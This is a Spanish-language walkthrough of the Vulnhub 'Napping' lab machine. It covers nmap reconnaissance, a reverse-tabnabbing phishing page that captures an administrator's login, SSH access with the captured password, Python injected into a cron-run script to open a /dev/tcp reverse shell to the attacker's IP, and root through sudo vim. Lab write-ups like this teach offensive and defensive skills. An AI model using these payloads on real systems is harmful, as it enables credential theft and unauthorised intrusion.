---
title: Vulnhub - Napping
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux]
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Napping/logo.jpeg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Napping Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

### Fase de Reconocimiento 🧣

Identificamos la dirección IP de la **`Máquina Napping`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.25  08:00:27:49:ee:4d       PCS Systemtechnik GmbH
```

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

  ![](/assets/images/Vulnhub/Easy/Napping/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

  ![](/assets/images/Vulnhub/Easy/Napping/02-versions.png)

c. Al visitar la página web nos creamos una nueva cuenta para autenticarnos en el servicio

![](/assets/images/Vulnhub/Easy/Napping/03-web.png)

> Página web después de autenticarnos.

* Vemos que la página dice que podemos promocionar un blog, el cual al colocar una URL, el administrador la verá, esto nos da la idea de un **`Cookie Hijacking`**, pero no funcionará ya que nos obtendremos la cookie.

* Lo que podemos hacer es **engañar** al administrador para que se loguee en una página idéntica al login del servicio y de esta forma podremos obtener sus credenciales, nos basamos en este [post](https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/)

![](/assets/images/Vulnhub/Easy/Napping/04-flaw.png)

> Explicación del vector a usar.

d. Estructuramos todo de acuerdo al dibujo anterior

1. Creamos nuestro index.html y lo hosteamos con **`python -m http.server 80`**

    ```html
    <html>
        <script>
            window.opener.location='http://<IP Atacante>:4444/fake_login.html';
        </script>	
    </html>
    ```

2. Copiamos el código fuente (**`http://<IP Napping>/index.php`**) del login, lo guardamos y lo hosteamos con **`nc -lvnp 4444`**

3. Ahora, 'promocionamos' nuestro link en la página web de la víctima

![](/assets/images/Vulnhub/Easy/Napping/05-steps.png)

> Damos clic en **Submit -> Here**

* Esperamos un poco y veremos credenciales del usuario **daniel**

![](/assets/images/Vulnhub/Easy/Napping/06-credentials.png)

* Tenemos que **`Url decodear`** la contraseña ya que **%40** es @

4. Estas credenciales (daniel:C@ughtm3napping123) nos sirven para autenticarnos en el servicio SSH

```bash
root@kali> ssh daniel@<IP Napping>
```

### Escalada de Privilegios 💹

a. Vemos que estamos en el grupo **administrators** y que podemos modificar un fichero

```bash
daniel@napping:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
daniel@napping:~$ find / -group administrators 2>/dev/null | xargs ls -la
-rw-rw-r-- 1 adrian administrators 492 Aug 21 19:57 /home/adrian/query.py
```

* Este archivo guarda cada cierto tiempo la hora de consulta del servicio web, para saber si está levantado o no.
* El dueño de este archivos es **`adrian`**, así que, todo comando que ejecutemos en este archivo lo haremos como este usuario, por lo que, nos enviaremos una reverse shell a nuestro equipo.

b. Inyectamos en el archivo el siguiente código

```bash
import os

os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP Atacante>/4444 0>&1'")
```

* Nos ponemos en escucha en nuestro equipo de atacante y esperamos a recibir al shell

    ```bash
    root@kali> nc -lvnp 4444
    <SNIP>
    adrian@napping:~$
    ```


c. Listamos privilegios sudoers que tengamos 

```bash
adrian@napping:~$ sudo -l
<SNIP>
    (root) NOPASSWD: /usr/bin/vim
```

* Escalamos privilegios como nos menciona [Gtfobins](https://gtfobins.github.io/gtfobins/vim/#sudo)

    ```bash
    adrian@napping:~$ sudo vim -c ':!/bin/bash'

    root@napping:/home/adrian#
    ```